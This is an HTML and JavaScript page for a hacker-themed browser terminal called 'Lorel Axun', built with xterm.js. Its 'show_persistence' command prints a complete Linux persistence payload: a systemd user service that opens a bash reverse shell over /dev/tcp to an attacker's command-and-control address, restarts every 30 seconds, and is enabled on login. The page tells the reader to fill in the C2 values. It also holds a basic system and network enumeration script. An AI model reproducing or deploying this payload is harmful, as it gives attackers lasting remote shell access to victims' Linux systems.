<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Lorel Axun</title>\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.min.css\" />\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/xterm-addon-attach@0.9.0/lib/xterm-addon-attach.min.js\"></script>\n    <script src=\"https://cdn.jsdelivr.net/npm/figlet/lib/figlet.js\"></script>\n    <style>\n        :root {\n            --bg: #1a1b26;\n            --fg: #c0caf5;\n            --black: #15161e;\n            --red: #f7768e;\n            --green: #9ece6a;\n            --yellow: #e0af68;\n            --blue: #7aa2f7;\n            --magenta: #bb9af7;\n            --cyan: #7dcfff;\n            --white: #a9b1d6;\n        }\n        body, html {\n            margin: 0;\n            padding: 0;\n            height: 100%;\n            background-color: var(--bg);\n            color: var(--fg);\n            font-family: 'Courier New', Courier, monospace;\n        }\n        #terminal-container {\n            width: 100%;\n            height: 100%;\n            padding: 10px;\n            box-sizing: border-box;\n        }\n        #desktop {\n            display: none;\n            width: 100%;\n            height: 100%;\n            background-size: cover;\n            background-position: center;\n            position: relative;\n        }\n        #dock {\n            position: absolute;\n            bottom: 20px;\n            left: 50%;\n            transform: translateX(-50%);\n            background-color: rgba(0, 0, 0, 0.5);\n            border-radius: 15px;\n            padding: 10px;\n            display: flex;\n            gap: 15px;\n        }\n        #terminal-icon {\n            width: 50px;\n            height: 50px;\n            background-color: var(--black);\n            border: 2px solid var(--cyan);\n            border-radius: 10px;\n            cursor: pointer;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            font-size: 12px;\n        }\n        #terminal-icon::before {\n            content: '>_';\n            color: var(--green);\n        }\n        #editor {\n            display: none;\n        }\n    </style>\n</head>\n<body>\n    <div id=\"terminal-container\"></div>\n    <div id=\"desktop\">\n        <div id=\"dock\">\n            <div id=\"terminal-icon\" title=\"Open Terminal\"></div>\n        </div>\n    </div>\n    <div id=\"editor\"></div>\n\n    <script>\n        const term = new Terminal({\n            cursorBlink: true,\n            theme: {\n                background: 'var(--bg)',\n                foreground: 'var(--fg)',\n                cursor: 'var(--fg)',\n                black: 'var(--black)',\n                red: 'var(--red)',\n                green: 'var(--green)',\n                yellow: 'var(--yellow)',\n                blue: 'var(--blue)',\n                magenta: 'var(--magenta)',\n                cyan: 'var(--cyan)',\n                white: 'var(--white)',\n            }\n        });\n        const fitAddon = new FitAddon.FitAddon();\n        term.loadAddon(fitAddon);\n        term.open(document.getElementById('terminal-container'));\n        fitAddon.fit();\n        window.addEventListener('resize', () => fitAddon.fit());\n\n        // Virtual State\n        let vfs = {\n            '/bin/recon.sh': '#!/bin/bash\\n# Basic Linux Enumeration Script\\necho \"--- System Info ---\"\\nuname -a\\nhostnamectl\\nlscpu | grep \"Model name\"\\n\\necho \"\\n--- User Info ---\"\\nwhoami\\nid\\nw\\n\\necho \"\\n--- Network Info ---\"\\nip a\\nss -tuln',\n            '/home/guest': {}\n        };\n        let env = {\n            'USER': 'guest',\n            'HOSTNAME': 'lorel-os',\n            'PWD': '/home/guest'\n        };\n        let commandHistory = [];\n        let historyIndex = -1;\n        let currentCommand = '';\n\n        function saveState() {\n            localStorage.setItem('lorel_vfs', JSON.stringify(vfs));\n            localStorage.setItem('lorel_env', JSON.stringify(env));\n        }\n\n        function loadState() {\n            const savedVfs = localStorage.getItem('lorel_vfs');\n            const savedEnv = localStorage.getItem('lorel_env');\n            if (savedVfs) vfs = JSON.parse(savedVfs);\n            if (savedEnv) env = JSON.parse(savedEnv);\n        }\n\n        loadState();\n\n        const prompt = () => {\n            const user = `\\x1b[32m${env.USER}\\x1b[0m`;\n            const hostname = `\\x1b[32m${env.HOSTNAME}\\x1b[0m`;\n            const pwd = `\\x1b[34m${env.PWD}\\x1b[0m`;\n            term.write(`\\r${user}@${hostname}:${pwd}$ `);\n        };\n\n        term.onKey(({ key, domEvent }) => {\n            const printable = !domEvent.altKey && !domEvent.ctrlKey && !domEvent.metaKey;\n\n            if (domEvent.keyCode === 13) { // Enter\n                if (currentCommand.trim() !== '') {\n                    term.writeln('');\n                    executeCommand(currentCommand);\n                    commandHistory.push(currentCommand);\n                    historyIndex = commandHistory.length;\n                }\n                currentCommand = '';\n                if (!term.attach) prompt();\n            } else if (domEvent.keyCode === 8) { // Backspace\n                if (currentCommand.length > 0) {\n                    term.write('\\b \\b');\n                    currentCommand = currentCommand.slice(0, -1);\n                }\n            } else if (printable) {\n                currentCommand += key;\n                term.write(key);\n            }\n        });\n\n        function executeCommand(command) {\n            const args = command.trim().split(' ');\n            const cmd = args[0];\n\n            if (cmd === 'startx') {\n                document.getElementById('terminal-container').style.display = 'none';\n                const desktop = document.getElementById('desktop');\n                desktop.style.backgroundImage = `url('https://source.unsplash.com/random/1920x1080?sig=${Math.random()}')`;\n                desktop.style.display = 'block';\n            } else if (cmd === 'connect' && args.length > 1) {\n                const url = args[1];\n                try {\n                    const socket = new WebSocket(url);\n                    const attachAddon = new AttachAddon.AttachAddon(socket);\n                    term.loadAddon(attachAddon);\n                    term.attach = true;\n                    term.writeln(`\\r\\n\\x1b[32mConnecting to ${url}...\\x1b[0m`);\n                } catch (e) {\n                    term.writeln(`\\r\\n\\x1b[31mError: ${e.message}\\x1b[0m`);\n                }\n            } else if (cmd === 'showrecon') {\n                term.writeln(vfs['/bin/recon.sh'].replace(/\\n/g, '\\r\\n'));\n            } else if (cmd === 'show_persistence') {\n                const payload = `\n\\x1b[33m# --- Linux Persistence Payload (systemd user service) ---\\x1b[0m\n\n# 1. Create directory for user services if it doesn't exist\n\\x1b[36mmkdir -p ~/.config/systemd/user\\x1b[0m\n\n# 2. Create the service file\n\\x1b[36mcat << EOF > ~/.config/systemd/user/lorel.service\\x1b[0m\n\\x1b[32m[Unit]\nDescription=Lorel Axun Persistence Service\n\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_C2_IP/YOUR_C2_PORT 0>&1'\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n\\x1b[0m\\x1b[36mEOF\\x1b[0m\n\n# 3. Reload systemd, enable and start the service\n\\x1b[36msystemctl --user daemon-reload\\x1b[0m\n\\x1b[36msystemctl --user enable --now lorel.service\\x1b[0m\n\n\\x1b[33m# --- Payload complete. Replace YOUR_C2_IP and YOUR_C2_PORT. ---\\x1b[0m\n`;\n                term.writeln(payload.replace(/\\n/g, '\\r\\n'));\n            } else {\n                term.writeln(`\\x1b[31mCommand not found: ${command}\\x1b[0m`);\n            }\n        }\n\n        document.getElementById('terminal-icon').addEventListener('click', () => {\n            document.getElementById('desktop').style.display = 'none';\n            document.getElementById('terminal-container').style.display = 'block';\n            term.focus();\n        });\n\n        // Boot sequence\n        figlet.parseFont('Standard', figlet.fonts.Standard);\n        figlet.text('Lorel Axun', { font: 'Standard' }, (err, data) => {\n            if (err) {\n                term.writeln('Lorel Axun');\n            } else {\n                term.writeln(data.replace(/\\n/g, '\\r\\n'));\n            }\n            term.writeln('Welcome to Lorel OS.');\n            term.writeln('Available commands:');\n            term.writeln('  \\x1b[32mstartx\\x1b[0m          - Start the graphical user interface.');\n            term.writeln('  \\x1b[32mconnect <ws_url>\\x1b[0m - Connect to a remote host via WebSocket.');\n            term.writeln('  \\x1b[32mshowrecon\\x1b[0m        - Display the content of the recon script.');\n            term.writeln('  \\x1b[32mshow_persistence\\x1b[0m - Display the Linux persistence payload.');\n            prompt();\n        });\n\n    </script>\n</body>\n</html>